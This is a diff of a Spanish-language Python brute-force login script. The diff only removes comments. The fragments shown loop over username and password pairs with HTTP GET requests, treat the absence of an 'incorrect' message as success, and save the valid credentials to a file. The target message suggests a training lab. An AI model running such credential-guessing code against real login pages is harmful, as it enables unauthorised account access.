@@ -93,7 +93,7 @@ def main():
                 try:
                     response = requests.get(url, params=params, headers=headers, timeout=10)
                     
-                    # Verificar si el login fue exitoso
+               
                     if "Username and/or password incorrect" not in response.text:
                         print(f"[+] ✓ ÉXITO [{intentos}/{len(usuarios)*len(passwords)}]: {usuario}:{password}")
                         credenciales_validas.append((usuario, password))
@@ -111,7 +111,7 @@ def main():
         print("\n\n[!]   ATAQUE INTERRUMPIDO POR EL USUARIO")
         print(f"[*] Intentos realizados antes de cancelar: {intentos}/{len(usuarios)*len(passwords)}")
     
-    # Mostrar resultados finales
+    
     print("-" * 70)
     print(f"\n[*] Resumen del ataque")
     print(f"[*] Total de intentos realizados: {intentos}/{len(usuarios)*len(passwords)}")
@@ -125,7 +125,7 @@ def main():
             print(f"    Usuario: {usuario:<20} | Contraseña: {password}")
         print("=" * 70)
         
-        # Guardar en archivo
+        
         with open("credenciales_encontradas.txt", "w") as f:
             f.write("Credenciales válidas encontradas:\n")
             f.write("=" * 50 + "\n")
